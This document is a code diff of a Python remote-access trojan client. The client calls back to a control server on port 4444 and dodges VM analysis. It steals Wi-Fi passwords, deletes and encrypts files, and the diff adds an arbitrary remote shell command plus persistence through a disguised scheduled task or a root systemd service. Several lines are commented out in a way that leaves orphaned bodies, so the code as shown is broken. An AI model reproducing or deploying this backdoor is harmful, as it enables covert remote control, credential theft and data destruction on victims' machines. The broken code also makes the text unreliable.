@@ -2,7 +2,7 @@ import os
 import sys
 import time
 import socket
-import ctypes
+# import ctypes
 import subprocess
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
@@ -27,41 +27,6 @@ def decrypt(data: bytes) -> bytes:
 
 def to_chunks(data: bytes, chunk_size: int = 1024):
     return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
-
-# ------------------ Registry Persistence ------------------
-
-def create_persistent_task(task_name="WinUpdateSvc"):
-
-    exe_path = sys.executable
-
-
-    ps_command = f'''
-    $Action = New-ScheduledTaskAction -Execute '{exe_path}'
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
-    $Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger
-    Register-ScheduledTask -TaskName "{task_name}" -InputObject $Task -Force
-    '''
-
-    try:
-
-        result = subprocess.run(["powershell", "-Command", ps_command],
-                                capture_output=True, text=True)
-        if result.returncode == 0:
-            print("✅ Task created successfully.")
-        else:
-            print("❌ Failed to create task:\n", result.stderr)
-    except Exception as e:
-        print(f"⚠️ Error running PowerShell: {e}")
-
-def remove_task(task_name="WinUpdateSvc"):
-    try:
-        result = subprocess.run(
-            f'schtasks /delete /tn "{task_name}" /f',
-            shell=True, capture_output=True, text=True)
-        print(result.stdout)
-    except Exception as e:
-        print(f"❌ Error removing task: {e}")
 
 # ------------------ Anti-Detection ------------------
 
@@ -153,7 +118,7 @@ def check_vm():
     except:
         return False
 
-def check_debugger():
+# def check_debugger():
     try:
         os_name = platform.system()
         debug_count = 0
@@ -243,7 +208,7 @@ def check_debugger():
 
 # ------------------ Wallpaper Control ------------------
 
-def change_wallpaper(image_path: str) -> bytes:
+# def change_wallpaper(image_path: str) -> bytes:
     if not os.path.exists(image_path):
         return encrypt(b"Image not found")
     
@@ -251,16 +216,95 @@ def change_wallpaper(image_path: str) -> bytes:
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
     return encrypt(b"Wallpaper changed")
 
+# ------------------ Operating System Prediction ------------------
+
 def predict_operating_system():
     os_name=platform.system()
     return os_name
 
+# ------------------ Task Scheduler Installation ------------------
+
+class TaskInstaller:
+    def __init__(self):
+        self.os_type = platform.system()
+        self.task_name = "SystemUpdateTask"
+        self.current_path = os.path.abspath(sys.executable)
+
+    def install_windows_task(self):
+        try:
+            cmd = f'schtasks /create /tn "{self.task_name}" /tr "{self.current_path}" /sc onlogon /rl highest /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            return result.returncode == 0
+        except Exception as e:
+            print(f"Error installing Windows task: {e}")
+            return False
+
+    def uninstall_windows_task(self):
+        try:
+            cmd = f'schtasks /delete /tn "{self.task_name}" /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            return result.returncode == 0
+        except Exception as e:
+            print(f"Error uninstalling Windows task: {e}")
+            return False
+
+    def install_linux_service(self):
+        try:
+            service_content = f"""[Unit]
+                                    Description=System Update Task
+                                    After=network.target
+                                    
+                                    [Service]
+                                    Type=simple
+                                    ExecStart={self.current_path}
+                                    Restart=always
+                                    RestartSec=3
+                                    User=root
+                                    
+                                    [Install]
+                                    WantedBy=multi-user.target
+                                    """
+            service_path = f"/etc/systemd/system/{self.task_name}.service"
+            with open(service_path, 'w') as f:
+                f.write(service_content)
+            subprocess.run("systemctl daemon-reload", shell=True)
+            subprocess.run(f"systemctl enable {self.task_name}", shell=True)
+            subprocess.run(f"systemctl start {self.task_name}", shell=True)
+            return True
+        except Exception as e:
+            print(f"Error installing Linux service: {e}")
+            return False
+
+    def uninstall_linux_service(self):
+        try:
+            subprocess.run(f"systemctl stop {self.task_name}", shell=True)
+            subprocess.run(f"systemctl disable {self.task_name}", shell=True)
+            service_path = f"/etc/systemd/system/{self.task_name}.service"
+            os.remove(service_path)
+            subprocess.run("systemctl daemon-reload", shell=True)
+            return True
+        except Exception as e:
+            print(f"Error uninstalling Linux service: {e}")
+            return False
+
+    def install_task(self):
+        if self.os_type == "Windows":
+            return self.install_windows_task()
+        else:
+            return self.install_linux_service()
+
+    def uninstall_task(self):
+        if self.os_type == "Windows":
+            return self.uninstall_windows_task()
+        else:
+            return self.uninstall_linux_service()
 
 # ------------------ Client Handler ------------------
 
 class ClientHandler:
     def __init__(self, connection: socket.socket):
         self.connection = connection
+        self.task_installer = TaskInstaller()
 
     def send(self, data: bytes):
         self.connection.sendall(data)
@@ -528,7 +572,7 @@ class ClientHandler:
                     self.recv()
                 
                 elif cmd.startswith("wifi-password "):
-                    wifi_network = cmd.split(" ",1)[1]
+                    wifi_network = cmd[14:]
                     command = f'netsh wlan show profile "{wifi_network}" key=clear'
                     if os_name=="Windows":
                         result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
@@ -543,7 +587,7 @@ class ClientHandler:
                     self.send_data(result.encode())                    
 
                 elif cmd.startswith("del "):
-                    filename = cmd.split(" ", 1)[1]
+                    filename = cmd[4:]
                     try:
                         os.remove(os.path.join(os.getcwd(), filename))
                         self.send(encrypt(b"File deleted"))
@@ -551,7 +595,7 @@ class ClientHandler:
                         self.send(encrypt(b"Deletion failed"))
 
                 elif cmd.startswith("cd "):
-                    directory = cmd.split(" ", 1)[1]
+                    directory = cmd[3:]
                     self.send(encrypt(b"1"))
                     try:
                         os.chdir(directory)
@@ -571,7 +615,12 @@ class ClientHandler:
                     file_name = decrypt(self.recv()).decode()
                     self.download(file_name)
 
-                elif cmd.startswith("wall "):
+                elif cmd.startswith("shell "):
+                    command = cmd[6:]
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    self.send_data(result.stdout.encode())
+
+                # elif cmd.startswith("wall "):
                     if os_name=="Windows":
                         filename = cmd.split(" ", 1)[1]
                         result = change_wallpaper(os.path.join(os.getcwd(), filename))
@@ -602,6 +651,22 @@ class ClientHandler:
                     file_name = decrypt(self.recv()).decode()
                     self.decrypt_file(file_name)          
 
+                elif cmd == "install-task":
+                    self.send(encrypt(b"1"))
+                    if self.task_installer.install_task():
+                        self.send(encrypt(b"Task installed successfully"))
+                    else:
+                        self.send(encrypt(b"Task installation failed"))
+                    self.recv()
+
+                elif cmd == "uninstall-task":
+                    self.send(encrypt(b"1"))
+                    if self.task_installer.uninstall_task():
+                        self.send(encrypt(b"Task uninstalled successfully"))
+                    else:
+                        self.send(encrypt(b"Task uninstallation failed"))
+                    self.recv()
+
                 else:
                     self.send(encrypt(b"1"))
                     self.send(encrypt(b"Unknown command"))
@@ -617,10 +682,10 @@ class ClientHandler:
 # ------------------ Main Server ------------------
 
 def Connect_to_server():
-    if not (check_debugger() or check_vm()):
+    if not check_vm():
         print(" No Debugger or VM detected.")
-        operating_system = predict_operating_system()
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            operating_system = predict_operating_system()
             while 1:
                 try:
                     sock.connect(("192.168.50.200",4444))
@@ -649,6 +714,4 @@ def Connect_to_server():
         sys.exit()
 
 if __name__ == "__main__":
-    #create_persistent_task()
-    #remove_task()
     Connect_to_server()
